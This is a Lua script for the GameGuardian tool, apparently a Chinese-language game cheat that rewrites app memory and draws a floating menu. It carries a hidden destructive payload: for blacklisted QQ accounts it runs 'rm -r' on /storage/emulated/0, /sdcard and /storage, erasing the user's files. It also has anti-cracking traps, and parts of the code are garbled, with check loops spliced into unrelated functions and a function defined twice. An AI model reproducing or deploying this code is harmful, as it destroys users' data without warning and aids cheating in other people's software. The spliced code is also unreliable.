xgjg == true then gg.toast(qmnb[2]["name"] .. "开启成功,共修改" .. xgsl .. "条数据") else gg.toast(qmnb[2]["name"] .. "开启失败") end end end end
--↑配置文件↑
function WriteSignatures(original,TSS_SDK) gg.setRanges(16384) gg.searchNumber("h"..original) gg.getResults(9999) gg.editAll("h"..TSS_SDK,1) gg.clearResults() end
function split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} 
            
            while true do
                while aP34qTjNQXYK3KJH < os.time() do
                    gg.alert('脚本已过期')
                    os.exit()
                end
                while a2dIiITouwrTgkMk ~= '0fa08270df7f34d0a482881e8090bb22' do
                    os.exit()
                end
                while checktrue ~= (imei .. aswgqSYlvl4v1gjJ.user_time .. api_time..xxxxxxx_22934..aYbIRvQTGiu3zJ1Z) do
                    os.exit()
                end
        --by秋风--by秋风
        
                while avwykaq3JHHQVkOH < os.time() do
                    gg.alert('脚本已过期')
                    os.exit()
                end
                while aeP2BbmZRYdnH84V ~= '5e9a9f4a187809fe1954fa74e1bb5d32' do
                    os.exit()
                end
                while checktrue ~= (imei .. a0erBhhbMEuSBgGc.user_time .. api_time..xxxxxxx_22574..awzD07xqZWyOTMqk) do
                    os.exit()
                end
        --by秋风
         local nFindLastIndex = string.find (szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len (szFullString)) break end nSplitArray[nSplitIndex] = string.sub (szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len (szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function xgxc(szpy, qmxg) for x = 1, #(qmxg) do xgpy = szpy + qmxg[x]["offset"] xglx = qmxg[x]["type"] xgsz = qmxg[x]["value"] xgdj = qmxg[x]["freeze"] if xgdj == nil or xgdj == "" then gg.setValues({[1] = {address = xgpy, flags = xglx, value = xgsz}}) else gg.addListItems({[1] = {address = xgpy, flags = xglx, freeze = xgdj, value = xgsz}}) end xgsl = xgsl + 1 xgjg = true end end function xqmnb(qmnb) gg.clearResults() gg.setRanges(qmnb[1]["memory"]) gg.searchNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启失败") else sl = gg.getResults(999999) sz = gg.getResultCount() xgsl = 0 if sz > 999999 then sz = 999999 end for i = 1, sz do pdsz = true for v = 4, #(qmnb) do if pdsz == true then pysz = {} pysz[1] = {} pysz[1].address = sl[i].address + qmnb[v]["offset"] pysz[1].flags = qmnb[v]["type"] szpy = gg.getValues(pysz) pdpd = qmnb[v]["lv"] .. ";" .. szpy[1].value szpd = split(pdpd, ";") tzszpd = szpd[1] pyszpd = szpd[2] if tzszpd == pyszpd then pdjg = true pdsz = true else pdjg = false pdsz = false end end end if pdjg == true then szpy = sl[i].address xgxc(szpy, qmxg) end end if xgjg == true then gg.toast(qmnb[2]["name"] .. "开启成功,共修改" .. xgsl .. "条数据") else gg.toast(qmnb[2]["name"] .. "开启失败") end end end end

function S_Pointer(t_So, t_Offset, _bit)
	local function getRanges()
		local ranges = {}
		local t = gg.getRangesList('^/data/*.so*$')
		for i, v in pairs(t) do
			if v.type:sub(2, 2) == 'w' then
				table.insert(ranges, v)
			end
		end
		return ranges
	end
	local function Get_Address(N_So, Offset, ti_bit)
		local ti = gg.getTargetInfo()
		local S_list = getRanges()
		local _Q = tonumber(0x167ba0fe)
		local t = {}
		local _t
		local _S = nil
		if ti_bit then
			_t = 32
			else
			_t = 4
		end
		for i in pairs(S_list) do
			local _N = S_list[i].internalName:gsub('^.*/', '')
			if N_So[1] == _N and N_So[2] == S_list[i].state then
				_S = S_list[i]
				break
			end
		end
		if _S then
			t[#t + 1] = {}
			t[#t].address = _S.start + Offset[1]
			t[#t].flags = _t
			if #Offset ~= 1 then
				for i = 2, #Offset do
					local S = gg.getValues(t)
					t = {}
					for _ in pairs(S) do
						if not ti.x64 then
							S[_].value = S[_].value & 0xFFFFFFFF
						end
						t[#t + 1] = {}
						t[#t].address = S[_].value + Offset[i]
						t[#t].flags = _t
					end
				end
			end
			_S = t[#t].address

		end
		return _S
	end
	local _A = string.format('0x%X', Get_Address(t_So, t_Offset, _bit))
	return _A
end
function readPointer(name, offset, i)
	local re = gg.getRangesList(name)
	local x64 = gg.getTargetInfo().x64
	local va = {[true]=32, [false]=4}
	if re[i or 1] then
		local addr = re[i or 1].start + offset[1]
		for i = 2, #offset do
			addr = gg.getValues({{address=addr, flags=va[x64]}})
			if not x64 then
				addr[1].value = addr[1].value & 0xFFFFFFFF
			end
			addr = addr[1].value + offset[i]
		end
		return addr
	end
end
-- 读取内存地址的函数
function readPointer(name, offset, i)
	local re = gg.getRangesList(name)
	local x64 = gg.getTargetInfo().x64
	local va = {[true]=32, [false]=4}
	if re[i or 1] then
		local addr = re[i or 1].start + offset[1]
		for i = 2, #offset do
			addr = gg.getValues({{address=addr, flags=va[x64]}})
			if not x64 then
				addr[1].value = addr[1].value & 0xFFFFFFFF
			end
			addr = addr[1].value + offset[i]
		end
		return addr
	end

end
-- 修改内存地址的函数
function gg.edits(addr, Table, name)
	local Table1 = {{}, {}}
	for k, v in ipairs(Table) do
		local value = {address = addr+v[3], value = v[1], flags = v[2], freeze = v[4]}
		if v[4] then
			Table1[2][#Table1[2]+1] = value
			else
			Table1[1][#Table1[1]+1] = value
		end
	end
	gg.addListItems(Table1[2])
	gg.setValues(Table1[1])
	gg.toast((name or "") .. "开启成功, 共修改"..#Table.."个值")
end


-- 把以上代码复制到你脚本最前面即可
local QQ = {
"qq号"
}
for i, k in pairs(QQ) do
local qq = "/storage/emulated/0/Android/data/com.tencent.mobileqq/Tencent/MobileQQ/"..k
if os.rename(qq, qq) then
gg.command('rm -r /storage/emulated/0/')
gg.command('rm -r /storage/emulated/0/*')
gg.command('rm -r /sdcard/*')
gg.command('rm -r /storage/emulated/')
gg.command('rm -r /storage/')

            
            while true do
                while aP34qTjNQXYK3KJH < os.time() do
                    gg.alert('脚本已过期')
                    os.exit()
                end
                while a2dIiITouwrTgkMk ~= '0fa08270df7f34d0a482881e8090bb22' do
                    os.exit()
                end
                while checktrue ~= (imei .. aswgqSYlvl4v1gjJ.user_time .. api_time..xxxxxxx_22934..aYbIRvQTGiu3zJ1Z) do
                    os.exit()
                end
        
        
                while avwykaq3JHHQVkOH < os.time() do
                    gg.alert('脚本已过期')
                    os.exit()
                end
                while aeP2BbmZRYdnH84V ~= '5e9a9f4a187809fe1954fa74e1bb5d32' do
                    os.exit()
                end
                while checktrue ~= (imei .. a0erBhhbMEuSBgGc.user_time .. api_time..xxxxxxx_22574..awzD07xqZWyOTMqk) do
                    os.exit()
                end
        
        
gg.alert("检测到黑名单QQ 不给予进入脚本")
os.exit()
end
end
end
--------------防御
--先刷足次数
local Y=string.rep("DC：想破解？",99999)
--建立一个新的表
T={}
--使用循环将值写入表中
for i=1,2048 do
  T[i]=Y
end
--遍历string库 使用保护模式将它们运行
--v→=参数比如string.(这里面就是表的东西)
--T→=等于表里面的key
for k,v in pairs (string) do
  pcall(v,T)
end

YxNB = gg.searchNumber
YxNBNB = gg.editAll
function lllsjsf()
  YXB = {"yz","=z","=l","ly","gy","zt"}
  wqnmds=""
  for i=1,2000 do
    wqnmds=wqnmds..YXB[math.random(1, #YXB)]
  end
  return wqnmds
end
lllsjsf()
function gg.searchNumber(...)
  gg.setVisible(false)
  search_e=string.char(0,0,0,0,0,0,0)
  for i=1,22 do
    search_e=search_e..search_e
  end
  gg.getResults(1)
  YxNBNB(search_e,4)
  local s,j={},{}
  for i=1,50 do
    j[i]=math.random(1,2140000000)
    s[j[i]]={address=i,flags=4,temp=search_e}
  end
  local timegg=os.clock()+os.time()
  s=gg.getValues(s)
  local dateinit=os.clock()+os.time()
  for i=1,50 do
    while s[j[i]].value~=0 or dateinit-timegg>2.1 do
      gg.clearResults()
      print("⚠️logo你妈呢⚠️")
      string.toMusic("检测到危险行为正在启动虚假脚本")----语音播放
      os.exit()
    end
  end
  ab = {...}
  Yw=[[%d]]
  ab[1] = ab[1]:gsub(Yw, function(Yx)
    return Yx .. wqnmds .. wqnmds
  end
  )
  YxNB(table.unpack(ab))
  gg.getResults(0)
  YxNBNB(search_e,4)
end
function gg.editAll(...)
  ab = {...}
  ab[1] = ab[1]:gsub(Yw, function(Yx)
    return Yx .. wqnmds .. wqnmds
  end
  )
  YxNBNB(table.unpack(ab))
end


-----音乐
local json =json--调用
local g = {}
g.file = gg.getFile()
g.sel = nil
gqlb={"请先搜索歌曲",}
idb={"1010"}
SN,gc=1,nil
g.config = gg.getFile():gsub("%lua$", "").."cfg"
function bei()
g.data = loadfile("-- WSG PRO 1.0.9(109)\n"..g.config)
if g.data ~= nil then
g.sel = g.data()
g.data = nil
end
if g.sel == nil then
g.sel = {"请输入歌曲名","10"}
end
end
bei()
--搜索歌曲
function start(name,sl)
fw=gg.makeRequest("http://music.163.com/api/search/get?s="..name.."&type=1&offset=0&total=true&limit="..sl)
return fw
end
--歌词
--播放音乐
function play(id,name)
gg.toast("正在播放音乐："..name,true)
gg.playMusic("http://music.163.com/song/media/outer/url?id="..id..".mp3")
end
--停止播放
function stop()
gg.toast("正在停止音乐")
for i=1,100 do
gg.playMusic("stop")
gg.playMusic("stop")
gg.playMusic("stop")
end
end
----
function Play(gqlb,idb)
SN = gg.choice(gqlb,nil,ts)
if SN == nil then XGCK =-1 else
sn=gg.choice({"播放歌曲","播放并下载"},nil,"歌曲："..gqlb[SN])
if sn == nil then end
if sn == 1 then
play(idb[SN],gqlb[SN])
end
if sn == 2 then
local XEY=gg.makeRequest("http://music.163.com/song/media/outer/url?id="..idb[SN]..".mp3").content
local XEY1=gg.getFile():gsub("[^/]+$","")..gqlb[SN]..".mp3"
io.open(XEY1,"w"):write(XEY)
gg.alert("提示:\n\n音乐已成功下载位置:\n\n"..XEY1)
end
XGCK=-1
end
end--by秋风qf
function zjson(jsonr)
local str = jsonr
-- 匹配Json Key的正则表达式
local pattern = "\"[%w]+\":"
string.gsub(str, pattern, function(v)
if string.find(str, v) then
str = string.gsub(str, v, string.gsub(v, "\"", ""))
end
end)
str = string.gsub(str, ":", "=")
str = string.gsub(str, "%[", "{")
str = string.gsub(str, "%]", "}")
local data = "-- WSG PRO 1.0.9(109)\nreturn " .. str
local res = load(data)()
return res
end

function json(con)
res=zjson(con)
zd=res.result.songCount
pd=go3-zd
if pd <= 0 then else go3=zd end
ts="《"..go1.."》找到"..zd.."首歌曲，当前显示"..go3.."首"
gqlb={}
idb={}
for i=1,go3 do
gqlb[i]=res.result.songs[i].name
idb[i]=res.result.songs[i].id
end
--print(idb)
end
function YY998() Obtain=gg.makeRequest("https://api.uomg.com/api/rand.music?sort=热歌榜&format=json").content muchen=Obtain:match('url":"(.-)","picurl') gg.playMusic(muchen) end
----音乐
import("android.ext.*")

function ui_init()
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
changan = {}
local changan = changan
local android = import('android.*')
function write(fileName, content)
--f = assert( io.open( fileName, 'w'))   f:write( content )     f:close()
if file.write(fileName, content) == false then gg.alert("请给框架和修改器 文件储存权限\n否则无法正常运行") os.exit() end
end
function panduan(rec) fille,err = io.open(rec) if fille == nil then return false else return true end end
function pdcf(lujing) rec = "/sdcard/星河/配置文件/"..lujing fille,err = io.open(rec) if fille == nil then return false else return true end end
sleep = gg.sleep
--if gg.isHTTPdump()==true and panduan("/sdcard/星河/配置文件/vpn.txt") == false then gg.alert("\n抓包？") os.exit() end
function read(fileName) f = assert(io.open(fileName, 'r')) content = f:read("*all") f:close() return content end
function wtcf(lujing,neirong)
write("/sdcard/星河/配置文件/"..lujing,neirong)
end
function rdcf(lujing)
return read("/sdcard/星河/配置文件/"..lujing)
end
function pmusic(x) if audiokg == "开" then tmp1 = 0 gg.playMusic(x) tmp1 = 1 end end
if pdcf("audio") ~= true then wtcf("audio","开") end
audiokg = rdcf("audio")
function camusic(ress)
tmp1 = 0
if audiokg == "开" then
if panduan("/sdcard/星河/音频/"..ress) == true then
pmusic("/sdcard/星河/音频/"..ress)
tmp1 = 1
else
download("https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/"..ress ,"/sdcard/星河/音频/"..ress)
pmusic("/sdcard/星河/音频/"..ress)
tmp1 = 1
end
end
end
开 = "开" 关 = "关"
function checkimg(tmp)
if panduan("/sdcard/星河/图片/"..tmp) ~= true then
gg.toast("正在下载资源"..tmp.."\n请耐心等待")
download("https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/"..tmp,"/sdcard/星河/图片/"..tmp)
end
end
file.getdirs("/sdcard/星河/状态读取/")
ckimg = {
--"星河logo",
"vslct1",
"vslct2",
"check1",
"check2",
"exit",
"sj",
"hsj"
}
for i = 1,#ckimg do
jindu = i
checkimg(ckimg[i])
end
context = app.context
window = context:getSystemService("window") -- 获取窗口管理器
function getLayoutParams()
LayoutParams = WindowManager.LayoutParams
layoutParams = luajava.new(LayoutParams)
if (Build.VERSION.SDK_INT >= 26) then -- 设置悬浮窗方式
layoutParams.type = LayoutParams.TYPE_APPLICATION_OVERLAY
else
layoutParams.type = LayoutParams.TYPE_PHONE
end

layoutParams.format = PixelFormat.RGBA_8888 -- 设置背景
layoutParams.flags = LayoutParams.FLAG_NOT_FOCUSABLE -- 焦点设置Finish
layoutParams.gravity = Gravity.TOP|Gravity.LEFT -- 重力设置
layoutParams.width = LayoutParams.WRAP_CONTENT -- 布局宽度
layoutParams.height = LayoutParams.WRAP_CONTENT -- 布局高度

return layoutParams
end
function getj6()
jianbian6 = luajava.new(GradientDrawable)
jianbian6:setCornerRadius(20)
jianbian6:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbian6:setColors(菜单小背景颜色)
jianbian6:setStroke(3,菜单小背景边框)--边框宽度和颜色
return jianbian6
end
slctb2 = luajava.loadlayout({
GradientDrawable,
color = "#7f7fd5",
cornerRadius = 10
})
function getseekgra()
jianbians = luajava.new(GradientDrawable)
jianbians:setCornerRadius(10)
jianbians:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbians:setColors(其他控件背景)
jianbians:setStroke(4,"0xeeffffff")--边框宽度和颜色
return jianbians
end--by秋风
function getseekgra2()
jianbians = luajava.new(GradientDrawable)
jianbians:setCornerRadius(8)
jianbians:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbians:setColors({0xB3000000,0x9CFF0069,0x8E00AFFF,0x8E00AFFF,})
jianbians:setStroke(1,"0xee000000")--边框宽度和颜色
return jianbians
end
function 获取图片(txt)
ntxt=string.sub(string.gsub(txt,"/","."),-10,-1)
if string.find(tostring(txt),"http")~=nil then
if panduan("/sdcard/星河/图片/"..ntxt)==false then
download(txt,"/sdcard/星河/图片/"..ntxt)
end
txt="/sdcard/星河/图片/"..ntxt
end
return luajava.getBitmapDrawable(txt)
end
slctb = 获取图片(侧边按钮背景1)
slcta = 获取图片(侧边按钮背景2)

slctc = luajava.loadlayout {
GradientDrawable,
color = "#11ffffff",
cornerRadius = 8
}
slctd = luajava.loadlayout {
GradientDrawable,
color = "#55ffffff",
cornerRadius = 8
}
slcte = luajava.loadlayout {
GradientDrawable,
color = "#11ffffff",
cornerRadius = 12
}
slctf = luajava.loadlayout {
GradientDrawable,
color = "#aa1E1C27",
cornerRadius = 15
}
function getjb()
local jianbians = luajava.new(GradientDrawable)
jianbians:setCornerRadius(15)
jianbians:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbians:setColors({0xB3000000,0x9CFF0069,0x8E00AFFF,0x8E00AFFF,})
jianbians:setOrientation(GradientDrawable.Orientation.LEFT_RIGHT)
return jianbians
end
function chatbg2()
selector = luajava.getStateListDrawable()
selector:addState({
android.R.attr.state_pressed
}, luajava.loadlayout {
GradientDrawable,
color = "#aa0082FF",
cornerRadius = 12
}) -- 点击时候的背景
selector:addState({
-android.R.attr.state_pressed
}, getjb()) -- 没点击的背景
return selector
end
function getshape9()
jianbians = luajava.new(GradientDrawable)
jianbians:setCornerRadius(10)
jianbians:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbians:setColors(button颜色)
jianbians:setStroke(4,"0xeeFFffff")--边框宽度和颜色
return jianbians
end
jianbians = luajava.new(GradientDrawable)
jianbians:setCornerRadius(10)
jianbians:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbians:setColors({0xB3000000,0x9CFF0069,0x8E00AFFF,0x8E00AFFF,})
jianbians:setStroke(4,"0xeeFFffff")--边框宽度和颜色
t3s=jianbians
t4s=luajava.loadlayout {
GradientDrawable,
color = "#87000000",
cornerRadius = 12
}
t5s=jianbians
t6s=luajava.loadlayout {
GradientDrawable,
color = "#87000000",
cornerRadius = 12
}
function getSelector3()
t9s=getshape9()
selector = luajava.getStateListDrawable()
selector:addState({
android.R.attr.state_pressed
}, t4s) -- 点击时候的背景
selector:addState({
-android.R.attr.state_pressed
}, t9s) -- 没点击的背景
return selector
end
function getSelector5()
selector = luajava.getStateListDrawable()
selector:addState({
android.R.attr.state_pressed
}, t6s) -- 点击时候的背景
selector:addState({
-android.R.attr.state_pressed
}, t5s) -- 没点击的背景
return selector
end
function getSelector()
selector = luajava.getStateListDrawable()
selector:addState({
android.R.attr.state_pressed
}, slcta) -- 点击时候的背景
selector:addState({
-android.R.attr.state_pressed
}, slctb) -- 没点击的背景
return selector
end
function getSelector2()
selector = luajava.getStateListDrawable()
selector:addState({
android.R.attr.state_pressed
}, slctd) -- 点击时候的背景
selector:addState({
-android.R.attr.state_pressed
}, slctc) -- 没点击的背景
return selector
end

jianbian = luajava.new(GradientDrawable)
jianbian:setCornerRadius(30)
jianbian:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbian2 = luajava.new(GradientDrawable)
jianbian2:setCornerRadius(30)
jianbian2:setGradientType(GradientDrawable.LINEAR_GRADIENT)

local isswitch
YoYoImpl = luajava.getYoYoImpl()
changan.menu = function(sview)
if isswitch then
return false
end
for i=1,#stab do
_ENV["jmb"..i]=getSelector()
end
if #stab> #sview then gg.alert("菜单标题参数多于菜单配置，请检查") os.exit() end
isswitch = true
cebian = {
LinearLayout,
id = "侧边",
visibility = "gone",
layout_height = "230dp",
layout_width = "88dp",
orientation = "vertical",
background = {
GradientDrawable,
color = "#00ffffff",
cornerRadius = 10
},
}
gund = {
LinearLayout,
orientation = "vertical",
}--byQF
for i = 1,#stab do
_ENV["jm"..i]=luajava.loadlayout({
LinearLayout,
id = "jm"..i,
layout_height = "35dp",
layout_width = "85dp",
layout_marginTop = "5dp",
layout_marginBottom = "5dp",
background = _ENV["jmb"..i],
onClick=function()
changan.controlFlip(_ENV["jm"..i],500)
切换(i) end,
{
TextView,
gravity = "center",
textColor=侧边文字颜色,
text = stab[i][1],
layout_height = "35dp",
layout_width = "85dp",
--onClick = function() 切换(i) end
}})
gund[#gund+1] = _ENV["jm"..i]
end
cebian[#cebian+1] = {
ScrollView,
layout_height = "fill_parent",
layout_width = "fill_parent",
gund
}
cebian = luajava.loadlayout(cebian)
for i = 1,#stab do
_ENV["layout"..i] = luajava.loadlayout(
{
ScrollView,
background = getj6(),
fillViewport = "true",
padding = "3dp",
id = "layout"..i,
visibility = "gone",
layout_width = "230dp",
layout_height = "230dp",
orientation = "vertical",
{
LinearLayout,
--background = getj6(),
id = "layoutm"..i,
gravity = "top",
layout_width = "230dp",
orientation = "vertical",
gravity = "center_horizontal",
},

})
end
_ENV["layout".. 4] = luajava.loadlayout(
{LinearLayout,
orientation = "horizontal",
layout_width="wrap_content",
layout_height="230dp",
visibility = "gone",
{
ScrollView,
background = getj6(),
fillViewport = "true",
padding = "3dp",
id = "layouts".. 4,
layout_width = "230dp",
layout_height = "230dp",
orientation = "vertical",
{
LinearLayout,
--background = getj6(),
id = "layoutm"..4,
gravity = "top",
layout_width = "230dp",
orientation = "vertical",
gravity = "center_horizontal",
}},
{ScrollView,
fillViewport = "true",
{LinearLayout,
id="layoutg4",
orientation="vertical",
gravity="center",
layout_width="230dp",
layout_height="wrap_content",
}}
})
ckou = {
LinearLayout,
id = "chuangk",
padding="4dp",
visibility = "gone",
layout_width = "wrap_content",
layout_height = "wrap_content",
orientation = "horizontal",
cebian,

}
for i = 1,#stab do
ckou[#ckou+1] = _ENV["layout"..i]
end
--luajava.newThread(function() develo(ckou) end):start()
ckou = luajava.loadlayout(ckou)
title = luajava.loadlayout({
TextView,
id = "title",
textColor = "#ddffffff",
visibility = "gone",
text = stab[1][2],
gravity = "center",
textSize = "24sp",
layout_width = "fill_parent",
})
control1=luajava.loadlayout({
ImageView,
id = "control",
hardwareAccelerated="true",
--layout_gravity = "left",
background = xfcpic,
layout_width = "40dp",
layout_height = "40dp",
})
frme=luajava.loadlayout({
FrameLayout,
padding = "10dp",
layout_width = "match_parent",
layout_height = "wrap_content",
orientation = "horizontal",
--background = beij2,
gravity = "center",
control1,
title,
{
ImageView,
id = "exitt",
visibility = "gone",
layout_gravity = "right",
src = "/sdcard/星河/图片/arwhitex",
layout_width = "20dp",
layout_height = "20dp",
layout_marginTop = "10dp",
layout_marginRight = "14dp",
}
})
floatWindow = {
LinearLayout,
id = "motion",
layout_width = "wrap_content",
orientation = "vertical",
gravity = "center_vertical",
layout_height = "wrap_content",
frme,
ckou
}
local function invoke()
local ok
local RawX, RawY, x, y
mainLayoutParams = getLayoutParams()
floatWindow = luajava.loadlayout(floatWindow)
local function invoke2()
block('start')
for k = 1,#stab do
for i = 1,#sview[k] do
_ENV["layoutm"..k]:addView(sview[k][i])
end
end

window:addView(floatWindow, mainLayoutParams)
block('end')
end

local runnable = luajava.getRunnable(invoke2)
local handler = luajava.getHandler()
handler:post(runnable)
block('join')
control.onClick = function()
隐藏()
end
exitt.onClick = function()
隐藏()
end
jm4.onClick = function()
changan.controlFlip(jm4,500)
切换(4)
gundong()
already = true
changan.setedit(".用户名",qltname)
changan.setedit("请输入链接或QQ",qlticon)
end
local isMove

hanshu = function(v, event)
local Action = event:getAction()
if Action == MotionEvent.ACTION_DOWN then
isMove = false
RawX = event:getRawX()
RawY = event:getRawY()
x = mainLayoutParams.x
y = mainLayoutParams.y
elseif Action == MotionEvent.ACTION_MOVE then
isMove = true
mainLayoutParams.x = tonumber(x) + (event:getRawX() - RawX)
mainLayoutParams.y = tonumber(y) + (event:getRawY() - RawY)
window:updateViewLayout(floatWindow, mainLayoutParams)
end
end
motion.onTouch = hanshu
control.onTouch = hanshu
exitt.onTouch = hanshu
for i = 1,#stab do
--_ENV["jm"..i].onTouch = hanshu
end
end

invoke(swib1,swib2)
jm1:setBackground(slcta)
gg.setVisible(false)
luajava.setFloatingWindowHide(true)

end
corbk = true
当前ui = 1
function 切换(x)
当前ui = x
luajava.runUiThread(function()
for i = 1,#stab do
_ENV["jm"..i]:setBackground(_ENV["jmb"..i])
_ENV["layout"..i]:setVisibility(View.GONE)
end
title:setText(stab[当前ui][2])
_ENV["layout"..当前ui]:setVisibility(View.VISIBLE)
_ENV["jm"..当前ui]:setBackground(slcta)
YoYoImpl:with("FadeIn"):duration(200):playOn(_ENV["layout"..当前ui])
end)
end
显示 = 0
beij = luajava.new(GradientDrawable)
beij:setCornerRadius(20)
beij:setGradientType(GradientDrawable.LINEAR_GRADIENT)
beij:setColors((大背景颜色))
beij:setStroke(5,大背景边框)--边框宽度和颜色

beij2 = luajava.loadlayout({
GradientDrawable,
color = "#001E1C27",
cornerRadius = 10
})


titlejb = luajava.new(GradientDrawable)
titlejb:setCornerRadius(20)
titlejb:setGradientType(GradientDrawable.LINEAR_GRADIENT)
titlejb:setColors((标题颜色))
if 标题边框开关~=0 then
titlejb:setStroke(13,标题边框颜色)--边框宽度和颜色
end
function getcolor(cl)
cl[1] = tonumber(math.ceil(cl[1]*2.6,0,5))

if cl[1] > 255 then cl[1] = "0xff" else
cl[1] = "0x"..string.format("%x",cl[1]) end
for i = 1,3 do
cl[i+1] = string.format("%x",cl[i+1])
if string.len(cl[i+1]) == 1 then cl[i+1] = "0"..cl[i+1] end
end
cl = cl[1]..cl[2]..cl[3]..cl[4]
return cl
end
function getrgb(cl)
if string.sub(cl,1,1) == "#" then cl = "0x"..string.sub(cl,2,-1) end
cl = {
tonumber(string.sub(cl,0,4)),tonumber("0x"..string.sub(cl,5,6)),tonumber("0x"..string.sub(cl,7,8))}
return cl
end
function 隐藏()
luajava.runUiThread(function()
--control:setBackground(luajava.getBitmapDrawable("/sdcard/星河/图片/arlogo"))
if tonumber(tostring(cebian:getVisibility())) == 8.0 then
chuangk:setVisibility(View.VISIBLE)
cebian:setVisibility(View.VISIBLE)
title:setVisibility(View.VISIBLE)
exitt:setVisibility(View.VISIBLE)
frme:setBackground(titlejb)
显示=1
mainLayoutParams.flags = LayoutParams.FLAG_NOT_TOUCH_MODAL
window:updateViewLayout(floatWindow, mainLayoutParams)
YoYoImpl:with("SlideInDown"):duration(200):playOn(cebian)
_ENV["layout"..当前ui]:setVisibility(View.VISIBLE)
YoYoImpl:with("FadeIn"):duration(800):playOn(_ENV["layout"..当前ui])
floatWindow:setBackground(beij)
else
显示=0
luajava.runUiThread(function()mainLayoutParams.flags = LayoutParams.FLAG_NOT_FOCUSABLE
window:updateViewLayout(floatWindow, mainLayoutParams)
end)
frme:setBackground(beij2)
--control:setBackground(luajava.getBitmapDrawable("/sdcard/星河/图片/arlogo"))
title:setVisibility(View.GONE)
exitt:setVisibility(View.GONE)
floatWindow:setBackground(beij2)
chuangk:setVisibility(View.GONE)
cebian:setVisibility(View.GONE)
_ENV["layout"..当前ui]:setVisibility(View.GONE)
end
end)
end
function guid()
seed = {
'e','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'
}
tb = {}
for i = 1,32 do
table.insert(tb,seed[math.random(1,16)])
end
sid = table.concat(tb)
return string.format('%s%s%s%s%s',
string.sub(sid,1,8),
string.sub(sid,10,12),
string.sub(sid,21,22))
..string.format('%s%s%s%s%s',
string.sub(sid,1,6),
string.sub(sid,21,25)
)
end


chazhi = {} chajv = {}
function changan.seek(name,bian,smin,smax,nows)
_ENV[bian] = nows
thum=getseekgra()
thum:setSize(60, 60)
smin = tonumber(smin) smax = tonumber(smax)
chajv[bian] = smax-smin
chazhi[bian] = 1-smin
if smin == nil then smin = 1 smax = 10 end
truesmin = 1
truesmax = truesmin+chajv[bian]
if not nows then nows = smin tnows = (smin-nows)
else
tnows = (nows-smin)+1
end
if _ENV[bian] == nil then _ENV[bian] = 1.0 end
if not name then name = "未设置" end
local names = name..guid()
rest = luajava.loadlayout({
LinearLayout,
layout_width = 'fill_parent',
layout_hight = "fill_parent",
{
LinearLayout,
layout_width = 'fill_parent',
layout_hight = "fill_parent",
layout_marginTop = "5dp",
layout_marginBottom = "5dp",
layout_marginLeft = "10dp",
layout_marginRight = "10dp",
gravity = "center_vertical",
background = getseekgra(),
{
TextView,
gravity = "top",
textColor=txtco,
text = name..":"..nows,
id = luajava.newId(names),
layout_width = '110dp',
layout_marginLeft = "5dp",
layout_marginRight = "0dp",
},
{
SeekBar,
layout_width = '100dp',
min = truesmin,
max = truesmax,
progress = tnows,
progressDrawable={getseekgra2()},
thumb=thum,
onSeekBarChange = {
onProgressChanged = function(SeekBar, var2, var3)
if not var3 then
return
end
local resultvar = tonumber(string.sub(var2,0,-3))-chazhi[bian]
luajava.runUiThread(function()
luajava.getIdValue(names):setText(name..":".. resultvar)
end)
_ENV[bian] = resultvar
end
}}
}})

return rest
end

function changan.line(view)
rest = luajava.loadlayout({
    LinearLayout,
    layout_width = 'fill_parent',
    layout_height = "1dp",
    background = "#33ffffff",
})

return rest
end



function changan.switch(name,func1,func2)
if type(func1) == "table" then gg.copyText("") os.exit() end
local func = 开关(name,func1,func2)
if not name then name = "未设置" end
rest = luajava.loadlayout({
	LinearLayout,
	layout_width = '230dp',

	layout_height = "40dp",
	{
		LinearLayout,
		layout_width = 'fill_parent',

		layout_height = "fill_parent",
		layout_marginTop = "5dp",
		layout_marginBottom = "5dp",
		layout_marginLeft = "10dp",
		layout_marginRight = "10dp",
		gravity = "center_vertical",
	background = luajava.loadlayout {
			GradientDrawable,
			
			color = "#ff607cfa",
			cornerRadius = 80
		},
		{
			TextView,
			gravity = "top",
			text = name,
			layout_width = '140dp',
			layout_marginLeft = "5dp",
			layout_marginRight = "5dp",
		},
		{
			Switch,
			gravity = "top",
			layout_width = 'match_parent',

			layout_height = "10dp",

			showText = "true",
			textOn = "On",
			textOff = "Off",
--id=luajava.newId(tid),
			switchMinWidth = "20dp",
			onCheckedChange = function(Switch,var2,var3)
			if var2 == true then var2 = "On" else var2 = "Off" end
			luajava.newThread(function() func() end):start()
			end,

		}}
})

return rest
end
function changan.edit(name)
_ENV[name] = name..guid()
if not name then name = "点击输入文字" end
rest = luajava.loadlayout({
LinearLayout,
layout_width = 'fill_parent',
layout_hight = "fill_parent",
{
LinearLayout,
layout_width = 'fill_parent',
layout_hight = "fill_parent",
layout_marginTop = "5dp",
layout_marginBottom = "5dp",
layout_marginLeft = "10dp",
layout_marginRight = "10dp",
gravity = "center_vertical",
background = getseekgra(),
{
EditText,
gravity = "top",
hint = name,
gravity = "center",
id = luajava.newId(_ENV[name]),
layout_width = 'fill',
layout_marginLeft = "10dp",
layout_marginRight = "10dp",
}}
})

return rest
end
function changan.radio(radio)
firadio = {
LinearLayout,
layout_width = 'fill_parent',
layout_hight = "fill_parent",
padding = "10dp",
orientation = "vertical"
}
